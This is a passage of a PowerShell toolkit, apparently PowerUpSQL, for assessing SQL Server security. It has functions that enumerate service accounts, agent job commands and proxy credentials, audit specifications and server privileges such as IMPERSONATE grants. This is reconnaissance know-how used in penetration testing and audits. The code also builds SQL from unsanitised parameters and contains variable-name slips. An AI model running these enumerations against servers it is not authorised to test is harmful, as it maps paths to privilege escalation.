                [AnalysisLogin] = @AnalysisLogin,
                [ReportLogin] = @ReportLogin,
            [IntegrationLogin] = @IntegrationDtsLogin'
        }
        else
        {
            $SysadminSetup = ''
            $SysadminQuery = ''
        }

        # Define Query
        $Query = "  -- Setup variables
            DECLARE		@SQLServerInstance	VARCHAR(250)
            DECLARE		@MSOLAPInstance		VARCHAR(250)
            DECLARE		@ReportInstance 	VARCHAR(250)
            DECLARE		@AgentInstance	 	VARCHAR(250)
            DECLARE		@IntegrationVersion	VARCHAR(250)
            DECLARE		@DBEngineLogin		VARCHAR(100)
            DECLARE		@AgentLogin		VARCHAR(100)
            DECLARE		@BrowserLogin		VARCHAR(100)
            DECLARE     	@WriterLogin		VARCHAR(100)
            DECLARE		@AnalysisLogin		VARCHAR(100)
            DECLARE		@ReportLogin		VARCHAR(100)
            DECLARE		@IntegrationDtsLogin	VARCHAR(100)

            -- Get Service Paths for default and name instance
            if @@SERVICENAME = 'MSSQLSERVER' or @@SERVICENAME = HOST_NAME()
            BEGIN
            -- Default instance paths
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
            set @MSOLAPInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLServerOLAPService'
            set @ReportInstance = 'SYSTEM\CurrentControlSet\Services\ReportServer'
            set @AgentInstance = 'SYSTEM\CurrentControlSet\Services\SQLSERVERAGENT'
            set @IntegrationVersion  = 'SYSTEM\CurrentControlSet\Services\MsDtsServer'+ SUBSTRING(CAST(SERVERPROPERTY('productversion') AS VARCHAR(255)),0, 3) + '0'
            END
            ELSE
            BEGIN
            -- Named instance paths
            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$' + cast(@@SERVICENAME as varchar(250))
            set @MSOLAPInstance = 'SYSTEM\CurrentControlSet\Services\MSOLAP$' + cast(@@SERVICENAME as varchar(250))
            set @ReportInstance = 'SYSTEM\CurrentControlSet\Services\ReportServer$' + cast(@@SERVICENAME as varchar(250))
            set @AgentInstance = 'SYSTEM\CurrentControlSet\Services\SQLAgent$' + cast(@@SERVICENAME as varchar(250))
            set @IntegrationVersion  = 'SYSTEM\CurrentControlSet\Services\MsDtsServer'+ SUBSTRING(CAST(SERVERPROPERTY('productversion') AS VARCHAR(255)),0, 3) + '0'
            END

            -- Get SQL Server - Calculated
            EXECUTE		master.dbo.xp_instance_regread
            N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
            N'ObjectName',@DBEngineLogin OUTPUT

            -- Get SQL Server Agent - Calculated
            EXECUTE		master.dbo.xp_instance_regread
            N'HKEY_LOCAL_MACHINE', @AgentInstance,
            N'ObjectName',@AgentLogin OUTPUT

            $SysadminSetup

            -- Dislpay results
            SELECT		'$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            [DBEngineLogin] = @DBEngineLogin,
            [AgentLogin] = @AgentLogin
        $SysadminQuery"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results
        $TblServiceAccount = $TblServiceAccount + $TblResults
    }

    End
    {
        # Return data
        $TblServiceAccount
    }
}

# ----------------------------------
#  Get-SQLAgentJob
# ----------------------------------
# Author: Leo Loobeek and Scott Sutherland
Function  Get-SQLAgentJob
{
    <#
            .SYNOPSIS
            This function will check the current login's privileges and return a list
            of the jobs they have privileges to view.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER ProxyCredential
            Only return SQL Agent jobs using a specific proxy credential.
            .PARAMETER UsingProxyCredential
            Only return SQL Agent jobs using a proxy credentials.
            .PARAMETER SubSystem
            Only return SQL Agent jobs for specific subsystems.
            .PARAMETER Keyword
            Only return SQL Agent jobs that have a command that includes a specific keyword.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER TimeOut
            Connection time out.
            .PARAMETER SuppressVerbose
            Suppress verbose errors.  Used when function is wrapped.
            .EXAMPLE
             PS C:\> Get-SQLInstanceLocal | Get-SQLAgentJob -Verbose -Username sa -Password 'Password123!' | select Instance, Job_name, Step_name, SubSystem, Command | ft
            VERBOSE: SQL Server Agent Job Search Starting...
            VERBOSE: MSSQLSRV04\BOSCHSQL : Connection Failed.
            VERBOSE: MSSQLSRV04\SQLSERVER2014 : Connection Success.
            VERBOSE: MSSQLSRV04\SQLSERVER2014 : - SQL Server Agent service enabled.
            VERBOSE: MSSQLSRV04\SQLSERVER2014 : - Attempting to list existing agent jobs as sa.
            VERBOSE: MSSQLSRV04\SQLSERVER2014 : - 4 agent jobs found.
            VERBOSE: MSSQLSRV04\SQLSERVER2016 : Connection Success.
            VERBOSE: MSSQLSRV04\SQLSERVER2016 : - SQL Server Agent service has not been started.
            VERBOSE: MSSQLSRV04\SQLSERVER2016 : - Attempting to list existing agent jobs as sa.
            VERBOSE: MSSQLSRV04\SQLSERVER2016 : - 3 agent jobs found.
            VERBOSE: 7 agents jobs were found in total.
            VERBOSE: SQL Server Agent Job Search Complete.

            Instance                               JOB_NAME                              step_name                             subsystem                             command                              
            --------                               --------                              ---------                             ---------                             -------                              
            MSSQLSRV04\SQLSERVER2014               syspolicy_purge_history               Verify that automation is enabled.    TSQL                                  IF (msdb.dbo.fn_syspolicy_is_autom...
            MSSQLSRV04\SQLSERVER2014               syspolicy_purge_history               Purge history.                        TSQL                                  EXEC msdb.dbo.sp_syspolicy_purge_h...
            MSSQLSRV04\SQLSERVER2014               syspolicy_purge_history               Erase Phantom System Health Records.  PowerShell                            if ('$(ESCAPE_SQUOTE(INST))' -eq '...
            MSSQLSRV04\SQLSERVER2014               test                                  test1                                 CmdExec                               whoami                               
            MSSQLSRV04\SQLSERVER2016               syspolicy_purge_history               Verify that automation is enabled.    TSQL                                  IF (msdb.dbo.fn_syspolicy_is_autom...
            MSSQLSRV04\SQLSERVER2016               syspolicy_purge_history               Purge history.                        TSQL                                  EXEC msdb.dbo.sp_syspolicy_purge_h...
            MSSQLSRV04\SQLSERVER2016               syspolicy_purge_history               Erase Phantom System Health Records.  PowerShell                            if ('$(ESCAPE_SQUOTE(INST))' -eq '...
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs for specific subsystems.')]
         [ValidateSet("TSQL","PowerShell","CMDEXEC","PowerShell","ActiveScripting","ANALYSISCOMMAND","ANALYSISQUERY","Snapshot","Distribution","LogReader","Merge","QueueReader")]
        [String]$SubSystem,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs that have a command that includes a specific keyword.')]
        [String]$Keyword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs using a proxy credentials.')]
        [Switch]$UsingProxyCredential,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Only return SQL Agent jobs using a specific proxy credential.')]
        [String]$ProxyCredential,
        
        [Parameter(Mandatory = $false,
        HelpMessage = 'Connect using Dedicated Admin Connection.')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        Write-Verbose -Message "SQL Server Agent Job Search Starting..."

        # Setup data table for output
        $TblResults = New-Object -TypeName System.Data.DataTable
        $null = $TblResults.Columns.Add('ComputerName')
        $null = $TblResults.Columns.Add('Instance')     
        $null = $TblResults.Columns.Add('DatabaseName')
        $null = $TblResults.Columns.Add('Job_Id')                                                                                                                                                                                        
        $null = $TblResults.Columns.Add('Job_Name')                                                                                                                                                                                                 
        $null = $TblResults.Columns.Add('Job_Description')  
        $null = $TblResults.Columns.Add('Job_Owner')
        $null = $TblResults.Columns.Add('Proxy_Id')  
        $null = $TblResults.Columns.Add('Proxy_Credential')                                                                                                                                                                                                          
        $null = $TblResults.Columns.Add('Date_Created') 
        $null = $TblResults.Columns.Add('Last_Run_Date')
        $null = $TblResults.Columns.Add('Enabled')                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
        $null = $TblResults.Columns.Add('Server')                                                                                                                                                                                        
        $null = $TblResults.Columns.Add('Step_Name')
        $null = $TblResults.Columns.Add('SubSystem')
        $null = $TblResults.Columns.Add('Command')          
        
        # Setup SubSystem filter
        if($SubSystem)
        {
            $SubSystemFilter = " and steps.subsystem like '$SubSystem'"
        }
        else
        {
            $SubSustemFilter = ''
        }    
        
        # Setup Command Keyword filter
        if($Keyword)
        {
            $KeywordFilter = " and steps.command like '%$Keyword%'"
        }
        else
        {
            $KeywordFilter = ''
        }   

        # Setup filter to only return jobs with proxy cred
        if($UsingProxyCredential)
        {
            $UsingProxyCredFilter = " and steps.proxy_id > 0"
        }
        else
        {
            $UsingProxyCredFilter = ''
        } 
        
        # Setup filter to only return jobs with specific proxy cred
        if($ProxyCredential)
        {
            $ProxyCredFilter = " and proxies.name like '$ProxyCredential'"
        }
        else
        {
            $ProxyCredFilter = ''
        }                                                                                                                                                                                                 
    }

    Process
    {
        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Setup DAC string
        if($DAC)
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut
        }
        else
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut
        }

        # Attempt connection
        try
        {
            # Open connection
            $Connection.Open()
            if(-not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."                
            }

            # Get some information about current context
            $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $CurrentLogin = $ServerInfo.CurrentLogin
            $ComputerName = $ServerInfo.ComputerName
            $Sysadmin = $ServerInfo.IsSysadmin

            # Check if Agent Job service is running
            $IsAgentServiceEnabled = Get-SQLQuery -Instance $Instance -Query "SELECT 1 FROM sysprocesses WHERE LEFT(program_name, 8) = 'SQLAgent'" -Username $Username -Password $Password -SuppressVerbose
            if ($IsAgentServiceEnabled)
            {
                Write-Verbose -Message "$Instance : - SQL Server Agent service enabled."
            }
            else
            {
                Write-Verbose -Message "$Instance : - SQL Server Agent service has not been started."
            }

            # Get logins that have SQL Agent roles
            # https://msdn.microsoft.com/en-us/library/ms188283.aspx
            $AddJobPrivs = Get-SQLDatabaseRoleMember -Username $Username -Password $Password -Instance $Instance -DatabaseName msdb  -SuppressVerbose| ForEach-Object { 
                if($_.RolePrincipalName -match "SQLAgentUserRole|SQLAgentReaderRole|SQLAgentOperatorRole") {
                    if ($_.PrincipalName -eq $CurrentLogin) { $_ }
                }
            }

            if($AgentJobPrivs -or ($Sysadmin -eq "Yes"))
            {
                Write-Verbose -Message "$Instance : - Attempting to list existing agent jobs as $CurrentLogin."


                # Reference: https://msdn.microsoft.com/en-us/library/ms189817.aspx
                $Query = "SELECT 	steps.database_name,
	                            job.job_id as [JOB_ID],
	                            job.name as [JOB_NAME],
	                            job.description as [JOB_DESCRIPTION],
								SUSER_SNAME(job.owner_sid) as [JOB_OWNER],
								steps.proxy_id,
								proxies.name as [proxy_account],
	                            job.enabled,
	                            steps.server,
	                            job.date_created,   
                                steps.last_run_date,								                             
								steps.step_name,
								steps.subsystem,
	                            steps.command
                            FROM [msdb].[dbo].[sysjobs] job
                            INNER JOIN [msdb].[dbo].[sysjobsteps] steps        
	                            ON job.job_id = steps.job_id
							left join [msdb].[dbo].[sysproxies] proxies
							 on steps.proxy_id = proxies.proxy_id
                            WHERE 1=1
                            $KeywordFilter
                            $SubSystemFilter
                            $ProxyCredFilter
                            $UsingProxyCredFilter"

                # Execute Query
                $result = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose
                
                # Check the results                                
                if(!($result)) {
                    Write-Verbose -Message "$Instance : - Either no jobs exist or the current login ($CurrentLogin) doesn't have the privileges to view them."
                    return
                }

                # Get number of results
                $AgentJobCount = $result.rows.count
                Write-Verbose -Message "$Instance : - $AgentJobCount agent jobs found."
                

                # Update data table
                $result | 
                ForEach-Object{
                    $null = $TblResults.Rows.Add($ComputerName,
                    $Instance,
                    $_.database_name,                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
                    $_.JOB_ID,                                                                                                                                                                                        
                    $_.JOB_NAME, 
                    $_.JOB_DESCRIPTION,                                                                                                                                                                                                         
                    $_.JOB_OWNER,
                    $_.proxy_id,    
                    $_.proxy_account, 
                    $_.date_created,
                    $_.last_run_date,                                                                                                                                                                                  
                    $_.enabled,                                                                                                                                                                                                     
                    $_.server,                                                                                                                                                                                        
                    $_.step_name,
                    $_.subsystem,
                    $_.command)
                }
            }
            else
            {
                Write-Verbose -Message "$Instance : - The current login ($CurrentLogin) does not have any agent privileges."
                return
            }

            # Close connection
            $Connection.Close()

            # Dispose connection
            $Connection.Dispose()

        }
        catch
        {
            # Connection failed
            if(-not $SuppressVerbose)
            {
                $ErrorMessage = $_.Exception.Message
                Write-Verbose -Message "$Instance : Connection Failed."
                #Write-Verbose  " Error: $ErrorMessage"
            }
        }        
    }

    End
    {
        Write-Verbose -Message "SQL Server Agent Job Search Complete."

        # Get total count of jobs
        $TotalAgentCount = $TblResults.rows.Count

        # Get subsystem summary data
        $SummarySubSystem = $TblResults | Group-Object SubSystem | Select Name, Count | Sort-Object Count -Descending

        # Get proxy summary data
        $SummaryProxyAccount = $TblResults | Select-Object proxy_credential -Unique | Measure-Object | Select-Object Count -ExpandProperty Count

        # Get system summary data
        $SummaryServer = $TblResults | Select-Object ComputerName -Unique | Measure-Object |  Select-Object Count -ExpandProperty Count

        # Get instance summary data
        $SummaryInstance = $TblResults | Select-Object Instance -Unique | Measure-Object |  Select-Object Count -ExpandProperty Count

        Write-Verbose -Message "---------------------------------"
        Write-Verbose -Message "Agent Job Summary" 
        Write-Verbose -Message "---------------------------------"
        Write-Verbose -Message " $TotalAgentCount jobs found"
        Write-Verbose -Message " $SummaryServer affected systems"
        Write-Verbose -Message " $SummaryInstance affected SQL Server instances"
        Write-Verbose -Message " $SummaryProxyAccount proxy credentials used"

        Write-Verbose -Message "---------------------------------"
        Write-Verbose -Message "Agent Job Summary by SubSystem" 
        Write-Verbose -Message "---------------------------------"
        $SummarySubSystem | 
        ForEach-Object {
            $SubSystem_Name = $_.Name
            $SubSystem_Count = $_.Count
            Write-Verbose -Message " $SubSystem_Count $SubSystem_Name Jobs"
        }
        Write-Verbose -Message " $TotalAgentCount Total"
        Write-Verbose -Message "---------------------------------"
       

        # Return data
        $TblResults
    }
}

# ----------------------------------
#  Get-SQLAuditDatabaseSpec
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLAuditDatabaseSpec
{
    <#
            .SYNOPSIS
            Returns Audit database specifications from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER AuditName
            Audit name.
            .PARAMETER AuditSpecification
            Audit specification.
            .PARAMETER AuditAction
            Audit action name.
            .EXAMPLE
            PS C:\> Get-SQLAuditDatabaseSpec -Verbose -Instance "SQLServer1"
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLAuditDatabaseSpec -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit name.')]
        [string]$AuditName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Specification name.')]
        [string]$AuditSpecification,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit action name.')]
        [string]$AuditAction,



        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblAuditDatabaseSpec = New-Object -TypeName System.Data.DataTable

        # Setup audit name filter
        if($AuditName)
        {
            $AuditNameFilter = " and a.name like '%$AuditName%'"
        }
        else
        {
            $AuditNameFilter = ''
        }

        # Setup spec name filter
        if($AuditSpecification)
        {
            $SpecNameFilter = " and s.name like '%$AuditSpecification%'"
        }
        else
        {
            $SpecNameFilter = ''
        }

        # Setup action name filter
        if($AuditAction)
        {
            $ActionNameFilter = " and d.audit_action_name like '%$AuditAction%'"
        }
        else
        {
            $ActionNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }


        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }


        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            audit_id as [AuditId],
            a.name as [AuditName],
            s.name as [AuditSpecification],
            d.audit_action_id as [AuditActionId],
            d.audit_action_name as [AuditAction],
            s.is_state_enabled,
            d.is_group,
            s.create_date,
            s.modify_date,
            d.audited_result
            FROM sys.server_audits AS a
            JOIN sys.database_audit_specifications AS s
            ON a.audit_guid = s.audit_guid
            JOIN sys.database_audit_specification_details AS d
            ON s.database_specification_id = d.database_specification_id WHERE 1=1
            $AuditNameFilter
            $SpecNameFilter
        $ActionNameFilter"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose

        # Append results
        $TblAuditDatabaseSpec = $TblAuditDatabaseSpec + $TblResults
    }

    End
    {
        # Return data
        $TblAuditDatabaseSpec
    }
}


# ----------------------------------
#  Get-SQLAuditServerSpec
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLAuditServerSpec
{
    <#
            .SYNOPSIS
            Returns Audit server specifications from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER AuditName
            Audit name.
            .PARAMETER AuditSpecification
            Audit specification.
            .PARAMETER AuditAction
            Audit action name.
            .EXAMPLE
            PS C:\> Get-SQLAuditServerSpec -Verbose -Instance "SQLServer1"
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLAuditServerSpec -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit name.')]
        [string]$AuditName,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Specification name.')]
        [string]$AuditSpecification,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Audit action name.')]
        [string]$AuditAction,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblAuditServerSpec = New-Object -TypeName System.Data.DataTable

        # Setup audit name filter
        if($AuditName)
        {
            $AuditNameFilter = " and a.name like '%$AuditName%'"
        }
        else
        {
            $AuditNameFilter = ''
        }

        # Setup spec name filter
        if($AuditSpecification)
        {
            $SpecNameFilter = " and s.name like '%$AuditSpecification%'"
        }
        else
        {
            $SpecNameFilter = ''
        }

        # Setup action name filter
        if($AuditAction)
        {
            $ActionNameFilter = " and d.audit_action_name like '%$AuditAction%'"
        }
        else
        {
            $ActionNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            audit_id as [AuditId],
            a.name as [AuditName],
            s.name as [AuditSpecification],
            d.audit_action_name as [AuditAction],
            s.is_state_enabled,
            d.is_group,
            d.audit_action_id as [AuditActionId],
            s.create_date,
            s.modify_date
            FROM sys.server_audits AS a
            JOIN sys.server_audit_specifications AS s
            ON a.audit_guid = s.audit_guid
            JOIN sys.server_audit_specification_details AS d
            ON s.server_specification_id = d.server_specification_id WHERE 1=1
            $AuditNameFilter
            $SpecNameFilter
        $ActionNameFilter"

        # Execute Query
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -SuppressVerbose

        # Append results
        $TblAuditServerSpec  = $TblAuditServerSpec  + $TblResults
    }

    End
    {
        # Return data
        $TblAuditServerSpec
    }
}


# ----------------------------------
#  Get-SQLServerPriv
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLServerPriv
{
    <#
            .SYNOPSIS
            Returns SQL Server login privilege information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER PermissionName
            Permission name to filter for.
            .EXAMPLE
            PS C:\> Get-SQLServerPriv -Instance SQLServer1\STANDARDDEV2014 -PermissionName IMPERSONATE

            ComputerName    : SQLServer1
            Instance        : SQLServer1\STANDARDDEV2014
            GranteeName     : public
            GrantorName     : sa
            PermissionClass : SERVER_PRINCIPAL
            PermissionName  : IMPERSONATE
            PermissionState : GRANT
            ObjectName      : sa
            ObjectType      : SQL_LOGIN
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLServerPriv -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Permission name.')]
        [string]$PermissionName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Table for output
        $TblServerPrivs = New-Object -TypeName System.Data.DataTable

        # Setup $PermissionName filter
        if($PermissionName)
        {
            $PermissionNameFilter = " WHERE PER.permission_name like '$PermissionName'"
        }
        else
        {
            $PermissionNameFilter = ''
        }
    }

    Process
    {
        # Note: Tables queried by this function typically require sysadmin privileges to get all rows.

        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "  SELECT  '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            GRE.name as [GranteeName],
            GRO.name as [GrantorName],
            PER.class_desc as [PermissionClass],
            PER.permission_name as [PermissionName],
            PER.state_desc as [PermissionState],
            COALESCE(PRC.name, EP.name, N'') as [ObjectName],
            COALESCE(PRC.type_desc, EP.type_desc, N'') as [ObjectType]
            FROM [sys].[server_permissions] as PER
            INNER JOIN sys.server_principals as GRO
            ON PER.grantor_principal_id = GRO.principal_id
            INNER JOIN sys.server_principals as GRE
            ON PER.grantee_principal_id = GRE.principal_id
            LEFT JOIN sys.server_principals as PRC
            ON PER.class = 101 AND PER.major_id = PRC.principal_id
            LEFT JOIN sys.endpoints AS EP
            ON PER.class = 105 AND PER.major_id = EP.endpoint_id
            $PermissionNameFilter
        ORDER BY GranteeName,PermissionName;"

        # Execute Query
        $TblServerPrivsTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append data as needed
        $TblServerPrivs = $TblServerPrivs + $TblServerPrivsTemp
    }

    End
    {
        # Return data
        $TblServerPrivs
    }
}


# ----------------------------------
#  Get-SQLDatabasePriv
# ----------------------------------
# Author: Scott Sutherland
Function  Get-SQLDatabasePriv
{
    <#
            .SYNOPSIS
            Returns database user privilege information from target SQL Servers.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER DAC
            Connect using Dedicated Admin Connection.
            .PARAMETER DatabaseName
            Database name to filter for.
            .PARAMETER NoDefaults
            Only select non default databases.
            .PARAMETER PermissionName
            Permission name to filter for.
            .PARAMETER PermissionType
            Permission type name to filter for.
            .PARAMETER PrincipalName
            Principal name to filter for.
            .EXAMPLE
            PS C:\> Get-SQLDatabasePriv -Instance SQLServer1\STANDARDDEV2014 -DatabaseName testdb -PermissionName "VIEW DEFINITION"

            ComputerName     : SQLServer1
            Instance         : SQLServer1\STANDARDDEV2014
            DatabaseName     : testdb
            PrincipalName    : createprocuser
            PrincipalType    : SQL_USER
            PermissionType   : SCHEMA
            PermissionName   : VIEW DEFINITION
            StateDescription : GRANT
            ObjectType       : SCHEMA
            ObjectName       : dbo
            .EXAMPLE
            PS C:\> Get-SQLInstanceLocal | Get-SQLDatabasePriv -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server database name to filter for.')]
